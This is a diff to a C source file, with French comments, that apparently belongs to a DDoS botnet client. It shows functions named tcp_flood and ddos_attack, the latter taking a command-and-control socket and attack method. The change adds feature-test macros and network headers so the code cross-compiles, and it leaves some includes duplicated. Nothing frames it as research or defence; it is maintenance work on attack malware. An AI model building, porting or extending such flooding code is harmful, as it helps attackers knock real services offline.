@@ -1,13 +1,25 @@
+/* Définitions nécessaires pour la compilation croisée */
+#define _GNU_SOURCE
+#define __USE_GNU
+#define _BSD_SOURCE
+#define __USE_MISC
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include <arpa/inet.h>
-#include <sys/types.h>
-#include <signal.h>
+#include <time.h>
 #include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <sys/time.h>
 #include <time.h>
 #include <fcntl.h>
 #include <sys/wait.h>
@@ -190,6 +202,14 @@ void tcp_flood(char* target, int port, int duration) {
 }
 
 // Fonction pour effectuer une attaque DDoS
+#ifndef __USE_MISC
+#define __USE_MISC
+#endif
+
+#ifndef _BSD_SOURCE
+#define _BSD_SOURCE
+#endif
+
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
     struct sockaddr_in target_addr;
     target_addr.sin_family = AF_INET;
@@ -197,6 +217,7 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
     target_addr.sin_addr.s_addr = inet_addr(target);
     time_t start_time = time(NULL);
     int sock;
+    char message[BUFFER_SIZE];
 
     // Configuration des paquets d'attaque
     #define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
